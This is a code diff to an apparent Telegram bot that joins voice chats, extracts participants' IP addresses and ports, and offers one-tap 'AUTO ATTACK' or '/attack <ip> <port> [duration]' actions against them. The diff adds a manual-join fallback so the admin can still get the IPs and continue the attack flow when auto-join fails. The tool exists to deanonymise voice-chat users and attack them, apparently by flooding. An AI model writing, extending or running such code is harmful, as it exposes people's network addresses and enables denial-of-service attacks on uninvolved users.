@@ -25,6 +25,7 @@ class BotState(str, Enum):
     SCANNING = "SCANNING"
     SELECTION = "SELECTION"
     JOINING = "JOINING"
+    MANUAL_JOIN_WAIT = "MANUAL_JOIN_WAIT"
     READY = "READY"
     CONFIRM_ATTACK = "CONFIRM_ATTACK"
     ATTACKING = "ATTACKING"
@@ -40,6 +41,7 @@ class SessionContext:
     target_port: int = 0
     progress_task: Optional[asyncio.Task] = None
     pending_attack: bool = False
+    manual_join_requested: bool = False
 
 
 class BotHandler:
@@ -173,6 +175,17 @@ class BotHandler:
         if data == "join:yes":
             await self._handle_join_yes(callback_query)
             return
+
+        if data == "manual_join:confirm":
+            await self._handle_manual_join_confirm(callback_query)
+            return
+
+        if data == "manual_join:cancel":
+            self.ctx.state = BotState.IDLE
+            self.ctx.manual_join_requested = False
+            await callback_query.message.edit_text("❌ Cancelled manual join flow.")
+            await callback_query.answer()
+            return
         
         if data == "join:no":
             self.ctx.state = BotState.IDLE
@@ -195,6 +208,10 @@ class BotHandler:
         # Handle leave
         if data == "leave":
             await self._handle_leave(callback_query)
+            return
+
+        if data == "manual_attack":
+            await callback_query.answer("Use /attack <ip> <port> [duration]")
             return
 
         # Handle global stop
@@ -239,49 +256,86 @@ class BotHandler:
         try:
             metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
             self.ctx.extracted_metadata = metadata
-            
-            # Check if we got any IPs
-            extracted_ips = metadata.get("extracted_ips", [])
-            
-            if not extracted_ips:
-                self.ctx.state = BotState.READY
+
+            # If bot cannot join directly, ask admin for manual join + confirm.
+            if not metadata.get("joined"):
+                self.ctx.state = BotState.MANUAL_JOIN_WAIT
+                self.ctx.manual_join_requested = True
+                notice = metadata.get("notice") or "Auto join failed."
                 await callback_query.message.edit_text(
-                    f"⚠️ Joined VC but no IP addresses extracted.\n\n"
-                    f"Use /attack <ip> <port> to manually attack."
+                    f"⚠️ {notice}\n\n"
+                    f"Please join the VC manually from client account, then tap confirm.\n"
+                    f"Admin confirmation ke baad IP extract hoga and attack flow continue hoga.",
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("✅ Manual Join Ho Gaya", callback_data="manual_join:confirm")],
+                        [InlineKeyboardButton("❌ Cancel", callback_data="manual_join:cancel")],
+                    ]),
                 )
                 return
 
-            # Format IP list
-            ip_list_text = "\n".join([
-                f"• {ip['ip']}:{ip['port']} ({ip['type']})" 
-                for ip in extracted_ips[:5]  # Show top 5
-            ])
-
-            join_status = "✅ Joined" if metadata.get("joined") else "ℹ️ Metadata extracted (join restricted)"
-            
-            await callback_query.message.edit_text(
-                f"{join_status}\n\n"
-                f"🎯 Extracted IPs:\n{ip_list_text}\n\n"
-                f"Select an action:",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🚀 AUTO ATTACK (First IP)", callback_data="attack:confirm")],
-                    [InlineKeyboardButton("📝 Manual /attack", callback_data="manual_attack")],
-                    [InlineKeyboardButton("🚪 Leave VC", callback_data="leave")]
-                ])
-            )
-            
-            self.ctx.state = BotState.CONFIRM_ATTACK
-            self.ctx.pending_attack = True
-            
-            # Set first IP as target
-            first_ip = extracted_ips[0]
-            self.ctx.target_ip = first_ip['ip']
-            self.ctx.target_port = first_ip['port'] if first_ip['port'] > 0 else 10001  # Default port
+            await self._process_extracted_metadata(callback_query, metadata)
 
         except Exception as exc:
             LOGGER.exception("Join/Extract failed")
             self.ctx.state = BotState.IDLE
             await callback_query.message.edit_text(f"❌ Join/Extract failed: {exc}")
+
+    async def _handle_manual_join_confirm(self, callback_query):
+        """Re-check metadata after admin confirms manual join."""
+        if not self.ctx.selected_record:
+            await callback_query.answer("No VC selected!", show_alert=True)
+            return
+
+        self.ctx.state = BotState.JOINING
+        await callback_query.message.edit_text("⏳ Verifying manual join and extracting IP metadata...")
+        await callback_query.answer()
+
+        try:
+            metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
+            self.ctx.extracted_metadata = metadata
+            self.ctx.manual_join_requested = False
+            await self._process_extracted_metadata(callback_query, metadata)
+        except Exception as exc:
+            LOGGER.exception("Manual join confirmation failed")
+            self.ctx.state = BotState.IDLE
+            self.ctx.manual_join_requested = False
+            await callback_query.message.edit_text(f"❌ Metadata extraction failed after manual join: {exc}")
+
+    async def _process_extracted_metadata(self, callback_query, metadata: dict):
+        """Normalize extracted metadata and show attack actions."""
+        extracted_ips = metadata.get("extracted_ips", [])
+
+        if not extracted_ips:
+            self.ctx.state = BotState.READY
+            await callback_query.message.edit_text(
+                "⚠️ VC access confirmed but no IP addresses extracted.\n\n"
+                "Use /attack <ip> <port> to continue manually."
+            )
+            return
+
+        ip_list_text = "\n".join([
+            f"• {ip['ip']}:{ip['port']} ({ip['type']})"
+            for ip in extracted_ips[:5]
+        ])
+
+        join_status = "✅ VC joined" if metadata.get("joined") else "✅ Manual join confirmed"
+        await callback_query.message.edit_text(
+            f"{join_status}\n\n"
+            f"🎯 Extracted IPs:\n{ip_list_text}\n\n"
+            f"Select an action:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🚀 AUTO ATTACK (First IP)", callback_data="attack:confirm")],
+                [InlineKeyboardButton("📝 Manual /attack", callback_data="manual_attack")],
+                [InlineKeyboardButton("🚪 Leave VC", callback_data="leave")]
+            ])
+        )
+
+        self.ctx.state = BotState.CONFIRM_ATTACK
+        self.ctx.pending_attack = True
+
+        first_ip = extracted_ips[0]
+        self.ctx.target_ip = first_ip['ip']
+        self.ctx.target_port = first_ip['port'] if first_ip['port'] > 0 else 10001
 
     async def _handle_attack_confirm(self, callback_query):
         """Handle attack confirmation from admin."""
